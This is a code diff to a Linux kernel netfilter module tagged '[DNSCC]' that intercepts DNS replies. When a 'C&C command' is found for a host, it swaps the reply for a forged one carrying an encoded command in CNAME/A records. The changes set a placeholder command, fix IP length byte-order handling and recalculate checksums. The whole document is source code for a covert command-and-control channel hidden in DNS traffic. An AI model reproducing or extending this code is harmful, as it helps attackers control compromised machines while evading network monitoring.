@@ -407,7 +407,6 @@ uint16_t manipulate_dns_reply(unsigned char* data, unsigned char* command, unsig
 	printk(KERN_INFO"after offset %x %x",new_dns_data[writer],new_dns_data[writer+1]);
 	writer += sizeof(uint16_t);
 	printk(KERN_INFO"CNAME - ----- writer %d",writer);
-
 	/* and the valid A record */
 	olda_ar = (unsigned char *)&new_dns_data[writer];
 	cname2_offset = htons(cname2_offset);
@@ -571,7 +570,7 @@ static unsigned int dnscc_send(unsigned int hooknum, struct sk_buff* skb, const 
 	//	if(check_command_exists(iph->daddr) == 1){
 			printk(KERN_INFO "[DNSCC] C&C command found for %pI4 replacing original DNS reply",&iph->daddr);
 			/* Manipulate the answer */
-			unsigned char *command = "test23";
+			unsigned char *command = "encodedfakecommand";
 //	command[0] = (uint16_t)3;
 //	command[4] = (uint16_t)0;
 			unsigned char *orig_dns_data;
@@ -592,10 +591,13 @@ static unsigned int dnscc_send(unsigned int hooknum, struct sk_buff* skb, const 
 			printk(KERN_INFO "SKB DATA LEN %d",payload_len);
 			new_dns_size = manipulate_dns_reply(orig_dns_data,command,new_dns_data,payload_len);
 			memcpy(data,new_dns_data,new_dns_size);
+			int src_err = 0, dst_err = 0;
+//		skb->csum = csum_partial(data, new_dns_size, 0 );
 			skb->len = skb->len - (payload_len) + new_dns_size;
 			printk(KERN_INFO "2new dns size: %d ",new_dns_size);
 			udph->len=htons(new_dns_size+8);
-			iph->tot_len = iph->tot_len - payload_len + new_dns_size;
+			printk(KERN_INFO" ip tot %d payload %d new dns %d",ntohs(iph->tot_len), payload_len , new_dns_size);
+			iph->tot_len = htons(ntohs(iph->tot_len) - payload_len + new_dns_size);
 			/* recalculate checksums */
 			iph->check = 0;
 	                ip_send_check (iph);
